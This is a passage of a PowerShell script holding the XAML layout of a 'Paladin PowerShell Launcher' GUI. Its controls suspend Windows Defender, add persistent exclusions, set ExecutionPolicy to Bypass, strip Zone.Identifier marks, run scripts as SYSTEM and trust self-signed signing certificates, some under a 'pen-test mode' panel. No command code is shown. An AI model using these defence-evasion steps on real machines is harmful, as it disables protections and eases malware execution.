                   Margin="0,1,0,0" TextWrapping="Wrap" Text=""/>
      </StackPanel>
    </StackPanel>

    <!-- MANIFEST TOGGLES -->
    <StackPanel Grid.Row="3" Margin="0,4,0,0">
      <TextBlock Text="BOOT MANIFEST" Style="{StaticResource SectionHeader}"/>
      <!-- Auto-route status: updated whenever a script is selected -->
      <Border Background="#0D1B2A" CornerRadius="3" Padding="8,5" Margin="0,0,0,4">
        <StackPanel Orientation="Horizontal">
          <TextBlock Text="[AUTO] " Foreground="#888888" FontSize="10" FontWeight="Bold"
                     VerticalAlignment="Center"/>
          <TextBlock x:Name="lblAutoRoute"
                     Text="Select a script - launch mode will be detected automatically"
                     Foreground="#FF8C00" FontSize="10" TextWrapping="Wrap"
                     VerticalAlignment="Center"/>
        </StackPanel>
      </Border>
      <!-- Advanced overrides: collapsed by default, power users only -->
      <Expander Foreground="#555555" FontSize="10" Margin="0,0,0,2"
                IsExpanded="False">
        <Expander.Header>
          <TextBlock Text="Advanced Overrides  (auto-routing handles these automatically)"
                     Foreground="#555555" FontSize="10"/>
        </Expander.Header>
        <WrapPanel Margin="0,4,0,0">
          <CheckBox x:Name="chkDirectLaunch" Content="Force Direct Launch"
                    Foreground="#888888" FontSize="10"
                    Style="{StaticResource ToggleCheck}" IsChecked="False" Width="200"/>
          <CheckBox x:Name="chkDefender"  Content="Suspend Defender"
                    Style="{StaticResource ToggleCheck}" IsChecked="True"  Width="200"/>
          <CheckBox x:Name="chkExclusion" Content="Add Folder Exclusion"
                    Style="{StaticResource ToggleCheck}" IsChecked="True"  Width="200"/>
          <CheckBox x:Name="chkPolicy"    Content="Unrestrict ExecutionPolicy"
                    Style="{StaticResource ToggleCheck}" IsChecked="True"  Width="230"/>
          <CheckBox x:Name="chkElevate"   Content="Elevate If Needed"
                    Style="{StaticResource ToggleCheck}" IsChecked="True"  Width="180"/>
          <CheckBox x:Name="chkSession"   Content="Session Bridge (SYSTEM)"
                    Style="{StaticResource ToggleCheck}" IsChecked="False" Width="220"/>
          <CheckBox x:Name="chkKeep"      Content="Keep Exclusion After Exit"
                    Style="{StaticResource ToggleCheck}" IsChecked="False" Width="230"/>
          <CheckBox x:Name="chkPrompt"    Content="Policy Prompt Post-Run"
                    Style="{StaticResource ToggleCheck}" IsChecked="False" Width="220"/>
        </WrapPanel>
      </Expander>
    </StackPanel>

    <!-- CREDENTIALS -->
    <StackPanel Grid.Row="4" Margin="0,4,0,0">
      <TextBlock Text="LAUNCH CREDENTIALS" Style="{StaticResource SectionHeader}"/>
      <CheckBox x:Name="chkUseCurrentUser"
                Content="Use current user (already elevated)"
                Style="{StaticResource ToggleCheck}"
                IsChecked="True" Margin="0,2,0,6"/>
      <StackPanel x:Name="pnlCredentials" IsEnabled="False" Opacity="0.45">
        <Grid Margin="0,0,0,4">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="110"/>
            <ColumnDefinition Width="*"/>
            <ColumnDefinition Width="24"/>
            <ColumnDefinition Width="110"/>
            <ColumnDefinition Width="*"/>
          </Grid.ColumnDefinitions>
          <TextBlock Grid.Column="0" Text="Admin Username:"
                     Style="{StaticResource FieldLabel}"/>
          <TextBox   x:Name="txtAdminUser" Grid.Column="1"
                     Style="{StaticResource TextInput}"
                     ToolTip="Administrator account: DOMAIN\User or .\LocalAdmin"
                     Margin="0,0,8,0"/>
          <TextBlock Grid.Column="3" Text="Password:"
                     Style="{StaticResource FieldLabel}"/>
          <PasswordBox x:Name="pwdAdminPass" Grid.Column="4"
                       Style="{StaticResource PasswordInput}"
                       ToolTip="Administrator password (stored only in memory, never written to disk)"/>
        </Grid>
        <TextBlock x:Name="lblCredHint"
                   Text="Format: DOMAIN\Username  or  .\LocalAdmin  or  COMPUTERNAME\Admin"
                   Style="{StaticResource CredStatus}"/>
      </StackPanel>
      <TextBlock x:Name="lblCredStatus" Margin="0,4,0,0"
                 Style="{StaticResource CredStatus}"
                 Text="Detecting elevation status..."/>
    </StackPanel>

    <!-- CODE SIGNING -->
    <StackPanel Grid.Row="5" Margin="0,4,0,0">
      <CheckBox x:Name="chkSign" Content="AUTO SIGN"
                Foreground="#FFB800" FontWeight="Bold" FontSize="12"
                FontFamily="Consolas" Margin="0,8,0,4" IsChecked="False"/>

      <StackPanel x:Name="pnlSign" IsEnabled="False" Opacity="0.45">
        <Grid Margin="0,0,0,4">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition Width="*"/>
          </Grid.ColumnDefinitions>
          <TextBlock Grid.Column="0" Text="Signer CN:" Style="{StaticResource FieldLabel}"/>
          <TextBox   x:Name="txtSignerCN" Grid.Column="1"
                     Style="{StaticResource TextInput}"
                     ToolTip="Certificate Subject Common Name (e.g. MyCodeSigner)"/>
        </Grid>
        <WrapPanel>
          <CheckBox x:Name="chkAutoCreate" Content="Auto-create self-signed cert"
                    Style="{StaticResource ToggleCheck}" IsChecked="True" Width="250"/>
          <CheckBox x:Name="chkTrustCU"    Content="Trust: CurrentUser"
                    Style="{StaticResource ToggleCheck}" IsChecked="True" Width="180"/>
          <CheckBox x:Name="chkTrustLM"    Content="Trust: LocalMachine"
                    Style="{StaticResource ToggleCheck}" IsChecked="False" Width="180"/>
          <CheckBox x:Name="chkTimestamp"  Content="Timestamp signature"
                    Style="{StaticResource ToggleCheck}" IsChecked="True" Width="180"/>
        </WrapPanel>
        <!-- CERT VALIDITY DURATION -->
        <Grid Margin="0,6,0,0">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition Width="72"/>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition Width="*"/>
          </Grid.ColumnDefinitions>
          <TextBlock Grid.Column="0" Text="Cert valid for:"
                     Style="{StaticResource FieldLabel}" VerticalAlignment="Center"/>
          <TextBox x:Name="txtCertValidQty" Grid.Column="1"
                   Style="{StaticResource TextInput}"
                   Text="5" TextAlignment="Center"
                   ToolTip="How long the self-signed cert should remain valid"/>
          <ComboBox x:Name="cmbCertValidUnit" Grid.Column="2"
                    Margin="6,0,0,0"
                    Foreground="#FF8C00" Background="#0A0A00"
                    BorderBrush="#FF6A00" FontFamily="Consolas" FontSize="11"
                    SelectedIndex="2"
                    ToolTip="Unit of time for cert validity">
            <ComboBoxItem Content="Days"/>
            <ComboBoxItem Content="Weeks"/>
            <ComboBoxItem Content="Months"/>
            <ComboBoxItem Content="Years"/>
          </ComboBox>
          <TextBlock Grid.Column="3"
                     x:Name="lblCertExpiry" Margin="10,0,0,0"
                     Foreground="#888888" FontFamily="Consolas" FontSize="10"
                     VerticalAlignment="Center" Text=""/>
        </Grid>
      </StackPanel>
    </StackPanel>

    <!-- AGENT MODE STATUS BANNER (visible only when launched by RMM runner) -->
    <Border Grid.Row="6" Margin="0,8,0,0"
            x:Name="pnlAgentBanner"
            Background="#0A1A0A" BorderBrush="#00FF88"
            BorderThickness="1" CornerRadius="3"
            Visibility="Collapsed">
      <DockPanel Margin="10,6,10,6">
        <TextBlock DockPanel.Dock="Left"
                   Text="[SYSTEM PIPE ACTIVE]"
                   Foreground="#00FF88" FontFamily="Consolas"
                   FontSize="11" FontWeight="Bold"
                   VerticalAlignment="Center"/>
        <TextBlock x:Name="lblAgentStatus"
                   DockPanel.Dock="Left" Margin="12,0,0,0"
                   Text="Connected to PaladinAgent - scripts execute as SYSTEM, no UAC"
                   Foreground="#88CC88" FontFamily="Consolas" FontSize="10"
                   VerticalAlignment="Center"/>
        <Button x:Name="btnPingAgent" Content="Ping"
                DockPanel.Dock="Right"
                Width="48" Height="20"
                Foreground="#00FF88" Background="#0D200D"
                BorderBrush="#00AA44" BorderThickness="1"
                FontFamily="Consolas" FontSize="10" Cursor="Hand"/>
      </DockPanel>
    </Border>

    <!-- LAUNCH BUTTON ROW: LAUNCH (standard) + RUN VIA AGENT (agent mode) -->
    <Grid Grid.Row="7" Margin="0,12,0,0">
      <Grid.ColumnDefinitions>
        <ColumnDefinition Width="*"/>
        <ColumnDefinition Width="Auto"/>
      </Grid.ColumnDefinitions>
      <Button x:Name="btnLaunch" Grid.Column="0"
              Content="&gt;&gt;  LAUNCH  &lt;&lt;"
              Style="{StaticResource BtnLaunch}"/>
      <Button x:Name="btnRunAgent" Grid.Column="1"
              Content="RUN AS SYSTEM"
              Margin="8,0,0,0"
              Width="160"
              Visibility="Collapsed"
              Foreground="#00FF88"
              Background="#0D200D"
              BorderBrush="#00AA44" BorderThickness="1"
              FontFamily="Consolas" FontSize="13" FontWeight="Bold"
              Cursor="Hand" IsEnabled="False"/>
    </Grid>

    <!-- BOOT CHECKLIST -->
    <Border Grid.Row="8" Margin="0,10,0,0"
            Background="#0A0A18" BorderBrush="#222244"
            BorderThickness="1" CornerRadius="3"
            x:Name="pnlChecklist" Visibility="Collapsed">
      <StackPanel Margin="10,8,10,8">
        <DockPanel Margin="0,0,0,6">
          <TextBlock Text="BOOT SEQUENCE" DockPanel.Dock="Left"
                     Foreground="#FF8C00" FontSize="11" FontWeight="Bold"
                     VerticalAlignment="Center"/>
          <Button x:Name="btnResetChecklist" Content="Reset"
                  DockPanel.Dock="Right" Width="52" Height="20"
                  Foreground="#555577" Background="#111122"
                  BorderBrush="#222244" BorderThickness="1"
                  FontFamily="Consolas" FontSize="10" Cursor="Hand"/>
        </DockPanel>
        <!-- One row per boot step. Tag = step key matched by Update-Checklist -->
        <ItemsControl x:Name="icChecklist">
          <ItemsControl.ItemTemplate>
            <DataTemplate>
              <DockPanel Margin="0,2,0,2" Height="20">
                <!-- Status indicator: colored rectangle -->
                <Border x:Name="indBorder" Width="8" Height="8"
                        CornerRadius="4" DockPanel.Dock="Left"
                        VerticalAlignment="Center" Margin="0,0,8,0"
                        Background="{Binding IndicatorColor}"/>
                <!-- Step label -->
                <TextBlock Text="{Binding Label}"
                           Foreground="{Binding TextColor}"
                           FontFamily="Consolas" FontSize="11"
                           VerticalAlignment="Center" DockPanel.Dock="Left"
                           Width="240"/>
                <!-- Status text -->
                <TextBlock Text="{Binding StatusText}"
                           Foreground="{Binding TextColor}"
                           FontFamily="Consolas" FontSize="11"
                           VerticalAlignment="Center"/>
              </DockPanel>
            </DataTemplate>
          </ItemsControl.ItemTemplate>
        </ItemsControl>
      </StackPanel>
    </Border>

    <!-- PEN-TEST MODE PANEL (collapsed until password verified) -->
    <Border Grid.Row="9" Margin="0,8,0,0"
            x:Name="pnlPenTest" Visibility="Collapsed"
            Background="#0D0000" BorderBrush="#880000"
            BorderThickness="1" CornerRadius="3">
      <StackPanel Margin="10,8,10,10">

        <!-- Header row -->
        <DockPanel Margin="0,0,0,8">
          <TextBlock Text="PEN-TEST MODE" DockPanel.Dock="Left"
                     Foreground="#FF4444" FontSize="12" FontWeight="Bold"
                     FontFamily="Consolas" VerticalAlignment="Center"/>
          <TextBlock Text=" // AUTHORIZED ENGAGEMENTS ONLY"
                     DockPanel.Dock="Left"
                     Foreground="#660000" FontSize="10"
                     FontFamily="Consolas" VerticalAlignment="Center"/>
          <Button x:Name="btnPenTestLock" Content="Lock"
                  DockPanel.Dock="Right"
                  Width="52" Height="20"
                  Foreground="#880000" Background="#1A0000"
                  BorderBrush="#660000" BorderThickness="1"
                  FontFamily="Consolas" FontSize="10" Cursor="Hand"
                  Margin="4,0,0,0"
                  ToolTip="Collapse and lock Pen-Test panel"/>
          <Button x:Name="btnPtRevert" Content="Revert All"
                  DockPanel.Dock="Right"
                  Width="76" Height="20"
                  Foreground="#FFAA44" Background="#1A0A00"
                  BorderBrush="#664400" BorderThickness="1"
                  FontFamily="Consolas" FontSize="10" Cursor="Hand"
                  ToolTip="Undo all changes made this session: restore Defender, remove added exclusions, restore ExecutionPolicy"/>
        </DockPanel>

        <!-- Session change tracker label -->
        <TextBlock x:Name="lblPtSessionChanges" Text="No changes recorded this session."
                   Foreground="#664400" FontFamily="Consolas" FontSize="10"
                   Margin="0,0,0,6" TextWrapping="Wrap"/>

        <!-- Row: Defender Status -->
        <DockPanel Margin="0,2,0,4">
          <TextBlock Text="Defender:" Width="140" Foreground="#AA3333"
                     FontFamily="Consolas" FontSize="11" VerticalAlignment="Center"/>
          <TextBlock x:Name="lblPtDefenderStatus" Text="--"
                     Foreground="#FF6666" FontFamily="Consolas" FontSize="11"
                     VerticalAlignment="Center" Margin="0,0,8,0"/>
          <Button x:Name="btnPtDefenderSuspend" Content="Suspend"
                  Height="22" Width="80"
                  Foreground="#FF4444" Background="#1A0000"
                  BorderBrush="#660000" BorderThickness="1"
                  FontFamily="Consolas" FontSize="11" Cursor="Hand"
                  Margin="0,0,4,0"
                  ToolTip="Suspend Defender real-time / script / behavior / IOAV scanning"/>
          <Button x:Name="btnPtDefenderRestore" Content="Restore"
                  Height="22" Width="80"
                  Foreground="#888888" Background="#111111"
                  BorderBrush="#333333" BorderThickness="1"
                  FontFamily="Consolas" FontSize="11" Cursor="Hand"
                  ToolTip="Restore Defender to pre-suspend state"/>
        </DockPanel>

        <!-- Row: Tamper Protection -->
        <DockPanel Margin="0,2,0,4">
          <TextBlock Text="Tamper Protection:" Width="140" Foreground="#AA3333"
                     FontFamily="Consolas" FontSize="11" VerticalAlignment="Center"/>
          <TextBlock x:Name="lblPtTamperStatus" Text="--"
                     Foreground="#FF6666" FontFamily="Consolas" FontSize="11"
                     VerticalAlignment="Center" Margin="0,0,8,0"/>
          <TextBlock x:Name="lblPtTamperHint" Text=""
                     Foreground="#664444" FontFamily="Consolas" FontSize="10"
                     VerticalAlignment="Center"/>
        </DockPanel>

        <!-- Row: ExecutionPolicy -->
        <DockPanel Margin="0,2,0,4">
          <TextBlock Text="ExecutionPolicy:" Width="140" Foreground="#AA3333"
                     FontFamily="Consolas" FontSize="11" VerticalAlignment="Center"/>
          <TextBlock x:Name="lblPtPolicyStatus" Text="--"
                     Foreground="#FF6666" FontFamily="Consolas" FontSize="11"
                     VerticalAlignment="Center" Margin="0,0,8,0"/>
          <Button x:Name="btnPtPolicyFix" Content="Set Bypass"
                  Height="22" Width="90"
                  Foreground="#FF4444" Background="#1A0000"
                  BorderBrush="#660000" BorderThickness="1"
                  FontFamily="Consolas" FontSize="11" Cursor="Hand"
                  ToolTip="Set ExecutionPolicy Bypass for LocalMachine scope via registry"/>
        </DockPanel>

        <!-- Row: Unblock-File (Zone Identifier strip) -->
        <Grid Margin="0,2,0,4">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="140"/>
            <ColumnDefinition Width="*"/>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition Width="Auto"/>
          </Grid.ColumnDefinitions>
          <TextBlock Grid.Column="0" Text="Unblock Path:" Foreground="#AA3333"
                     FontFamily="Consolas" FontSize="11" VerticalAlignment="Center"/>
          <TextBox Grid.Column="1" x:Name="txtPtUnblockPath"
                   Background="#0A0000" Foreground="#FFAAAA"
                   BorderBrush="#660000" BorderThickness="1"
                   FontFamily="Consolas" FontSize="11"
                   Height="22" Margin="0,0,4,0"
                   ToolTip="Folder or file to unblock (removes Zone.Identifier ADS -- strips 'downloaded from internet' mark)"/>
          <Button Grid.Column="2" x:Name="btnPtUnblockBrowse" Content="Browse..."
                  Height="22" Width="70"
                  Foreground="#AA4444" Background="#1A0000"
                  BorderBrush="#550000" BorderThickness="1"
                  FontFamily="Consolas" FontSize="10" Cursor="Hand"
                  Margin="0,0,4,0"
                  ToolTip="Browse for folder or file to unblock"/>
          <Button Grid.Column="3" x:Name="btnPtUnblock" Content="Unblock"
                  Height="22" Width="72"
                  Foreground="#FF4444" Background="#1A0000"
                  BorderBrush="#660000" BorderThickness="1"
                  FontFamily="Consolas" FontSize="11" Cursor="Hand"
                  ToolTip="Strip Zone.Identifier ADS from all PS1 files under path"/>
        </Grid>

        <!-- Row: Add Persistent Exclusion -->
        <Grid Margin="0,2,0,2">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="140"/>
            <ColumnDefinition Width="*"/>
            <ColumnDefinition Width="Auto"/>
            <ColumnDefinition Width="Auto"/>
          </Grid.ColumnDefinitions>
          <TextBlock Grid.Column="0" Text="Add Exclusion:" Foreground="#AA3333"
                     FontFamily="Consolas" FontSize="11" VerticalAlignment="Center"/>
          <TextBox Grid.Column="1" x:Name="txtPtExclPath"
                   Background="#0A0000" Foreground="#FFAAAA"
                   BorderBrush="#660000" BorderThickness="1"
                   FontFamily="Consolas" FontSize="11"
                   Height="22" Margin="0,0,4,0"
                   ToolTip="Folder path to add as a persistent Defender ExclusionPath (survives process exit)"/>
          <Button Grid.Column="2" x:Name="btnPtExclBrowse" Content="Browse..."
                  Height="22" Width="70"
                  Foreground="#AA4444" Background="#1A0000"
                  BorderBrush="#550000" BorderThickness="1"
                  FontFamily="Consolas" FontSize="10" Cursor="Hand"
                  Margin="0,0,4,0"
                  ToolTip="Browse for folder to add as Defender exclusion"/>
          <Button Grid.Column="3" x:Name="btnPtAddExclusion" Content="Add"
                  Height="22" Width="52"
                  Foreground="#FF4444" Background="#1A0000"
                  BorderBrush="#660000" BorderThickness="1"
                  FontFamily="Consolas" FontSize="11" Cursor="Hand"
                  ToolTip="Add path as persistent Defender ExclusionPath"/>
        </Grid>

      </StackPanel>
    </Border>

    <!-- LOG PANEL -->
    <Grid Grid.Row="10" Margin="0,4,0,0">
      <Grid.RowDefinitions>
        <RowDefinition Height="Auto"/>
        <RowDefinition Height="*"/>
      </Grid.RowDefinitions>
      <DockPanel Grid.Row="0" Margin="0,0,0,4">
        <TextBlock Text="LAUNCH LOG" Style="{StaticResource SectionHeader}"
                   DockPanel.Dock="Left" Margin="0,0,0,0" VerticalAlignment="Center"/>
        <Button x:Name="btnClearLog" Content="Clear"
                Style="{StaticResource BtnClear}"
                DockPanel.Dock="Right" Width="60" HorizontalAlignment="Right"/>
      </DockPanel>
      <Border Grid.Row="1" Background="#080810" BorderBrush="#222244"
              BorderThickness="1" CornerRadius="3">
        <RichTextBox x:Name="rtbLog"
                     Background="Transparent"
                     BorderThickness="0"
                     IsReadOnly="True"
                     FontFamily="Consolas"
                     FontSize="11"
                     Foreground="#CCCCCC"
                     VerticalScrollBarVisibility="Auto"
                     HorizontalScrollBarVisibility="Auto"
                     Padding="8">
        </RichTextBox>
      </Border>
    </Grid>

  </Grid>
</Window>
'@

#------------------------------------------------------------------------------
# LOAD WINDOW
#------------------------------------------------------------------------------
try {
    $script:Window = [System.Windows.Markup.XamlReader]::Parse($xamlString)
    Set-WindowPaladinIcon -Win $script:Window   # apply ghost icon (KI: embedded b64 ICO)
} catch {
    [System.Windows.MessageBox]::Show(
        "Failed to load GUI XAML.`n`n$_",
        "Paladin PowerShell Launcher",
